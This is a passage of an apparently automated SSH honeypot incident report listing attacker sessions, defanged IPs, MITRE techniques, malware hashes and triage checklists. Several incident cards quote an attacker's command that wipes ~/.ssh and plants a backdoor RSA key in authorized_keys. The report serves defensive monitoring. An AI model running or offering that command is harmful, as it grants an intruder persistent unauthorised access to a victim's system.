| `2026-05-10 14:23:55` | `cowrie.command.failed` |
| `2026-05-10 14:23:55` | `cowrie.log.closed` |
| `2026-05-10 14:23:55` | `cowrie.session.params` |
| `2026-05-10 14:23:55` | `cowrie.command.input` |
| `2026-05-10 14:23:55` | `cowrie.session.file_download` |
| `2026-05-10 14:23:55` | `cowrie.log.closed` |
| `2026-05-10 14:23:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.44[.]172` to AbuseIPDB if not already reported
- [ ] Block `87.106.44[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-214cae23a4da

| Field | Detail |
|---|---|
| **Source IP** | `87.106.44[.]172` |
| **First Seen** | 2026-05-10 14:23 |
| **Last Seen** | 2026-05-10 14:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 14:23:58` | `cowrie.session.connect` |
| `2026-05-10 14:23:58` | `cowrie.client.version` |
| `2026-05-10 14:23:58` | `cowrie.client.kex` |
| `2026-05-10 14:23:58` | `cowrie.login.success` |
| `2026-05-10 14:23:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.44[.]172` to AbuseIPDB if not already reported
- [ ] Block `87.106.44[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a323e567d7e8

| Field | Detail |
|---|---|
| **Source IP** | `175.118.127[.]138` |
| **First Seen** | 2026-05-10 14:38 |
| **Last Seen** | 2026-05-10 14:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 14:38:11` | `cowrie.session.connect` |
| `2026-05-10 14:38:11` | `cowrie.client.version` |
| `2026-05-10 14:38:11` | `cowrie.client.kex` |
| `2026-05-10 14:38:11` | `cowrie.login.success` |
| `2026-05-10 14:38:12` | `cowrie.session.params` |
| `2026-05-10 14:38:12` | `cowrie.command.input` |
| `2026-05-10 14:38:12` | `cowrie.command.failed` |
| `2026-05-10 14:38:12` | `cowrie.log.closed` |
| `2026-05-10 14:38:12` | `cowrie.session.params` |
| `2026-05-10 14:38:12` | `cowrie.command.input` |
| `2026-05-10 14:38:12` | `cowrie.session.file_download` |
| `2026-05-10 14:38:12` | `cowrie.log.closed` |
| `2026-05-10 14:38:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.118.127[.]138` to AbuseIPDB if not already reported
- [ ] Block `175.118.127[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63bfc5aa5a06

| Field | Detail |
|---|---|
| **Source IP** | `175.118.127[.]138` |
| **First Seen** | 2026-05-10 14:38 |
| **Last Seen** | 2026-05-10 14:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 14:38:14` | `cowrie.session.connect` |
| `2026-05-10 14:38:14` | `cowrie.client.version` |
| `2026-05-10 14:38:14` | `cowrie.client.kex` |
| `2026-05-10 14:38:15` | `cowrie.login.success` |
| `2026-05-10 14:38:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.118.127[.]138` to AbuseIPDB if not already reported
- [ ] Block `175.118.127[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-313ebc01fc40

| Field | Detail |
|---|---|
| **Source IP** | `50.84.211[.]204` |
| **First Seen** | 2026-05-10 14:46 |
| **Last Seen** | 2026-05-10 14:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 14:46:40` | `cowrie.session.connect` |
| `2026-05-10 14:46:40` | `cowrie.client.version` |
| `2026-05-10 14:46:41` | `cowrie.client.kex` |
| `2026-05-10 14:46:42` | `cowrie.login.success` |
| `2026-05-10 14:46:42` | `cowrie.session.params` |
| `2026-05-10 14:46:42` | `cowrie.command.input` |
| `2026-05-10 14:46:42` | `cowrie.command.failed` |
| `2026-05-10 14:46:43` | `cowrie.log.closed` |
| `2026-05-10 14:46:43` | `cowrie.session.params` |
| `2026-05-10 14:46:43` | `cowrie.command.input` |
| `2026-05-10 14:46:43` | `cowrie.session.file_download` |
| `2026-05-10 14:46:43` | `cowrie.log.closed` |
| `2026-05-10 14:46:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.84.211[.]204` to AbuseIPDB if not already reported
- [ ] Block `50.84.211[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffad277304b7

| Field | Detail |
|---|---|
| **Source IP** | `50.84.211[.]204` |
| **First Seen** | 2026-05-10 14:46 |
| **Last Seen** | 2026-05-10 14:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 14:46:46` | `cowrie.session.connect` |
| `2026-05-10 14:46:46` | `cowrie.client.version` |
| `2026-05-10 14:46:47` | `cowrie.client.kex` |
| `2026-05-10 14:46:48` | `cowrie.login.success` |
| `2026-05-10 14:46:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.84.211[.]204` to AbuseIPDB if not already reported
- [ ] Block `50.84.211[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-573dc345d515

| Field | Detail |
|---|---|
| **Source IP** | `175.118.127[.]138` |
| **First Seen** | 2026-05-10 14:54 |
| **Last Seen** | 2026-05-10 14:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 14:54:33` | `cowrie.session.connect` |
| `2026-05-10 14:54:33` | `cowrie.client.version` |
| `2026-05-10 14:54:33` | `cowrie.client.kex` |
| `2026-05-10 14:54:34` | `cowrie.login.success` |
| `2026-05-10 14:54:34` | `cowrie.session.params` |
| `2026-05-10 14:54:34` | `cowrie.command.input` |
| `2026-05-10 14:54:34` | `cowrie.command.failed` |
| `2026-05-10 14:54:34` | `cowrie.log.closed` |
| `2026-05-10 14:54:35` | `cowrie.session.params` |
| `2026-05-10 14:54:35` | `cowrie.command.input` |
| `2026-05-10 14:54:35` | `cowrie.session.file_download` |
| `2026-05-10 14:54:35` | `cowrie.log.closed` |
| `2026-05-10 14:54:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.118.127[.]138` to AbuseIPDB if not already reported
- [ ] Block `175.118.127[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfca3ee4f6ca

| Field | Detail |
|---|---|
| **Source IP** | `175.118.127[.]138` |
| **First Seen** | 2026-05-10 14:54 |
| **Last Seen** | 2026-05-10 14:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 14:54:37` | `cowrie.session.connect` |
| `2026-05-10 14:54:37` | `cowrie.client.version` |
| `2026-05-10 14:54:37` | `cowrie.client.kex` |
| `2026-05-10 14:54:38` | `cowrie.login.success` |
| `2026-05-10 14:54:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.118.127[.]138` to AbuseIPDB if not already reported
- [ ] Block `175.118.127[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0be723917c2d

| Field | Detail |
|---|---|
| **Source IP** | `190.181.25[.]210` |
| **First Seen** | 2026-05-10 14:54 |
| **Last Seen** | 2026-05-10 14:55 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 14:54:59` | `cowrie.session.connect` |
| `2026-05-10 14:54:59` | `cowrie.client.version` |
| `2026-05-10 14:55:00` | `cowrie.client.kex` |
| `2026-05-10 14:55:02` | `cowrie.login.success` |
| `2026-05-10 14:55:02` | `cowrie.session.params` |
| `2026-05-10 14:55:02` | `cowrie.command.input` |
| `2026-05-10 14:55:02` | `cowrie.command.failed` |
| `2026-05-10 14:55:03` | `cowrie.log.closed` |
| `2026-05-10 14:55:03` | `cowrie.session.params` |
| `2026-05-10 14:55:03` | `cowrie.command.input` |
| `2026-05-10 14:55:04` | `cowrie.session.file_download` |
| `2026-05-10 14:55:04` | `cowrie.log.closed` |
| `2026-05-10 14:55:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.25[.]210` to AbuseIPDB if not already reported
- [ ] Block `190.181.25[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d874e63fac60

| Field | Detail |
|---|---|
| **Source IP** | `190.181.25[.]210` |
| **First Seen** | 2026-05-10 14:55 |
| **Last Seen** | 2026-05-10 14:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 14:55:07` | `cowrie.session.connect` |
| `2026-05-10 14:55:07` | `cowrie.client.version` |
| `2026-05-10 14:55:08` | `cowrie.client.kex` |
| `2026-05-10 14:55:09` | `cowrie.login.success` |
| `2026-05-10 14:55:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.25[.]210` to AbuseIPDB if not already reported
- [ ] Block `190.181.25[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a23fdbb14602

| Field | Detail |
|---|---|
| **Source IP** | `50.84.211[.]204` |
| **First Seen** | 2026-05-10 14:56 |
| **Last Seen** | 2026-05-10 14:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 14:56:34` | `cowrie.session.connect` |
| `2026-05-10 14:56:34` | `cowrie.client.version` |
| `2026-05-10 14:56:34` | `cowrie.client.kex` |
| `2026-05-10 14:56:35` | `cowrie.login.success` |
| `2026-05-10 14:56:36` | `cowrie.session.params` |
| `2026-05-10 14:56:36` | `cowrie.command.input` |
| `2026-05-10 14:56:36` | `cowrie.command.failed` |
| `2026-05-10 14:56:36` | `cowrie.log.closed` |
| `2026-05-10 14:56:37` | `cowrie.session.params` |
| `2026-05-10 14:56:37` | `cowrie.command.input` |
| `2026-05-10 14:56:37` | `cowrie.session.file_download` |
| `2026-05-10 14:56:38` | `cowrie.log.closed` |
| `2026-05-10 14:56:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.84.211[.]204` to AbuseIPDB if not already reported
- [ ] Block `50.84.211[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-700f7ff27a4c

| Field | Detail |
|---|---|
| **Source IP** | `50.84.211[.]204` |
| **First Seen** | 2026-05-10 14:56 |
| **Last Seen** | 2026-05-10 14:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 14:56:40` | `cowrie.session.connect` |
| `2026-05-10 14:56:40` | `cowrie.client.version` |
| `2026-05-10 14:56:41` | `cowrie.client.kex` |
| `2026-05-10 14:56:42` | `cowrie.login.success` |
| `2026-05-10 14:56:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.84.211[.]204` to AbuseIPDB if not already reported
- [ ] Block `50.84.211[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `175.118.127[.]138` | **30** | 2026-05-10 14:09 | 2026-05-10 14:56 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `87.106.44[.]172` | **30** | 2026-05-10 13:26 | 2026-05-10 14:33 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `120.48.26[.]185` | **29** | 2026-05-10 13:36 | 2026-05-10 13:48 | 7m | 17 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `50.84.211[.]204` | **24** | 2026-05-10 14:36 | 2026-05-10 14:56 | 0m | 24 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `150.136.129[.]10` | **22** | 2026-05-10 13:26 | 2026-05-10 13:46 | 0m | 22 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `190.181.25[.]210` | **14** | 2026-05-10 14:35 | 2026-05-10 14:56 | 0m | 14 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `72.253.251[.]7` | **5** | 2026-05-10 13:26 | 2026-05-10 13:30 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `106.13.70[.]73` | 1 | 2026-05-10 14:05 | 2026-05-10 14:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `114.219.157[.]97` | 1 | 2026-05-10 14:07 | 2026-05-10 14:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `114.220.238[.]224` | 1 | 2026-05-10 13:28 | 2026-05-10 13:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.18.88[.]70` | 1 | 2026-05-10 13:30 | 2026-05-10 13:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `178.124.179[.]158` | 1 | 2026-05-10 14:37 | 2026-05-10 14:37 | 14s | 0 | `T1592` | 🟢 LOW |
| `219.151.43[.]25` | 1 | 2026-05-10 13:47 | 2026-05-10 13:47 | 14s | 0 | `T1592` | 🟢 LOW |
| `60.167.166[.]161` | 1 | 2026-05-10 14:17 | 2026-05-10 14:19 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `14.18.88[.]70` | CN | CHINANET Guangdong province network | **100** ⚠️ | 23 |
| `87.106.44[.]172` | GB | IONOS SE | **100** ⚠️ | 48 |
| `72.253.251[.]7` | US | HAWAIIAN TELCOM | **100** ⚠️ | 50 |
| `219.151.43[.]25` | CN | CHINANET Xizang province network | **100** ⚠️ | 11 |
| `114.220.238[.]224` | CN | Chinanet Jiangsu Province Network | **100** ⚠️ | 50 |
| `114.219.157[.]97` | CN | Chinanet Jiangsu Province Network | **100** ⚠️ | 50 |
| `50.84.211[.]204` | US | RGB Hospitality | **100** ⚠️ | 50 |
| `106.13.70[.]73` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 43 |
| `60.167.166[.]161` | CN | CHINANET anhui province network | **100** ⚠️ | 50 |
| `190.181.25[.]210` | BO | AXS Bolivia S. A. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 180 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 142 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 21 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 11 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 11 |

---

## 🔕 False Positive Summary (33 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 28 |
| AbuseIPDB score 12 below threshold 25 | 1 |
| AbuseIPDB score 19 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 215 cases |
| Tool 34  | Credential Extractor        | ✅ 163 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 21 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 33 filtered (15.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
